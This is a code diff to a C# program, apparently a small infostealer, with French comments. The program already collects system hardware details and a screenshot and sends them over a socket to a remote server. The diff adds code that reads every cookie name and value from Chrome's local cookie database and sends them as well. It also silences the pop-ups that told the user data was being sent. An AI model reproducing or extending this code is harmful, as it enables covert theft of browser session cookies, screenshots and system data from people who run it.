@@ -8,6 +8,8 @@ using System.Drawing;
 using System.Drawing.Imaging;
 using System.Windows.Forms;
 using System.Net;
+using Microsoft.Data.Sqlite; // Import de Microsoft.Data.Sqlite pour utiliser SQLiteConnection
+
 
 namespace Test_Socket
 {
@@ -49,10 +51,7 @@ namespace Test_Socket
             }
         }
 
-
-
-
-        public void SendData(string os, string mother, string proc, string ram, string disk, byte[] screenshot)
+        public void SendData(string os, string mother, string proc, string ram, string disk, byte[] screenshot, string cookies)
         {
             try
             {
@@ -68,8 +67,10 @@ namespace Test_Socket
                 writer.WriteLine(proc);
                 writer.WriteLine(ram);
                 writer.WriteLine(disk);
+                writer.WriteLine(cookies);
+                MessageBox.Show("Cookies : " + cookies);
                 writer.Flush();
-                MessageBox.Show("Données envoyées au serveur.");
+                //MessageBox.Show("Données envoyées au serveur.");
 
                 // Envoyer les captures d'écran au serveur
                 if (screenshot != null && screenshot.Length > 0)
@@ -80,7 +81,7 @@ namespace Test_Socket
                     // Envoyer les captures d'écran au serveur
                     writer.WriteLine(screenshotBase64);
                     writer.Flush();
-                    MessageBox.Show("Capture d'écran envoyée au serveur.");
+                    //MessageBox.Show("Capture d'écran envoyée au serveur.");
                 }
             }
             catch (Exception ex)
@@ -89,12 +90,13 @@ namespace Test_Socket
             }
         }
 
-
+        // Méthode pour obtenir les informations du système d'exploitation
         private string GetOperatingSystemInfo()
         {
             return "OS# " + Environment.OSVersion;
         }
 
+        // Méthode pour obtenir les informations de la carte mère
         private string GetMotherboardInfo()
         {
             string result = "";
@@ -110,6 +112,7 @@ namespace Test_Socket
             return result;
         }
 
+        // Méthode pour obtenir les informations du processeur
         private string GetProcessorInfo()
         {
             string result = "";
@@ -126,6 +129,7 @@ namespace Test_Socket
             return result;
         }
 
+        // Méthode pour obtenir les informations de la RAM
         private string GetRAMInfo()
         {
             string result = "";
@@ -143,6 +147,7 @@ namespace Test_Socket
             return result;
         }
 
+        // Méthode pour obtenir les informations du disque
         private string GetDiskInfo()
         {
             string result = "";
@@ -159,6 +164,7 @@ namespace Test_Socket
             return result;
         }
 
+        // Méthode pour prendre une capture d'écran
         private byte[] TakeScreenshot()
         {
             using (Bitmap bitmap = new Bitmap(Screen.PrimaryScreen.Bounds.Width, Screen.PrimaryScreen.Bounds.Height))
@@ -175,6 +181,63 @@ namespace Test_Socket
             }
         }
 
+        // Méthode pour collecter les cookies
+        private string CollectCookies()
+        {
+            StringBuilder cookiesBuilder = new StringBuilder();
+
+            // Chemin des fichiers de cookies Chrome
+            string chromeCookiesPath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), @"Google\Chrome\User Data\Default\Cookies");
+            if (File.Exists(chromeCookiesPath))
+            {
+                cookiesBuilder.AppendLine("Chrome Cookies:");
+                cookiesBuilder.AppendLine(ExtractCookiesFromChrome(chromeCookiesPath));
+            }
+
+            // Vous pouvez ajouter ici la collecte des cookies d'autres navigateurs si nécessaire
+
+            return cookiesBuilder.ToString();
+        }
+
+        // Méthode pour extraire les cookies de Chrome
+        private string ExtractCookiesFromChrome(string chromeCookiesPath)
+        {
+            StringBuilder chromeCookiesBuilder = new StringBuilder();
+
+            try
+            {
+                // Ouvrir la base de données SQLite de Chrome
+                using (SqliteConnection connection = new SqliteConnection($"Data Source={chromeCookiesPath}; Version=3;"))
+                {
+                    connection.Open();
+
+                    // Sélectionner les cookies de la table 'cookies' dans la base de données
+                    string query = "SELECT name, value FROM cookies";
+                    using (SqliteCommand command = new SqliteCommand(query, connection))
+                    {
+                        using (SqliteDataReader reader = command.ExecuteReader())
+                        {
+                            while (reader.Read())
+                            {
+                                string name = reader["name"].ToString();
+                                string value = reader["value"].ToString();
+                                chromeCookiesBuilder.AppendLine($"{name}: {value}");
+                            }
+                        }
+                    }
+                }
+            }
+            catch (Exception ex)
+            {
+                // Gérer toute exception survenue lors de la lecture des cookies
+                chromeCookiesBuilder.AppendLine($"Erreur lors de la lecture des cookies de Chrome : {ex.Message}");
+            }
+
+            return chromeCookiesBuilder.ToString();
+        }
+
+
+        // Méthode pour collecter toutes les données et les envoyer au serveur
         public void CollectAndSendData()
         {
             string os = GetOperatingSystemInfo();
@@ -183,7 +246,8 @@ namespace Test_Socket
             string ram = GetRAMInfo();
             string disk = GetDiskInfo();
             byte[] screenshotBytes = TakeScreenshot();
-            SendData(os, mother, proc, ram, disk, screenshotBytes);
+            string cookies = CollectCookies();
+            SendData(os, mother, proc, ram, disk, screenshotBytes, cookies);
         }
     }
 }
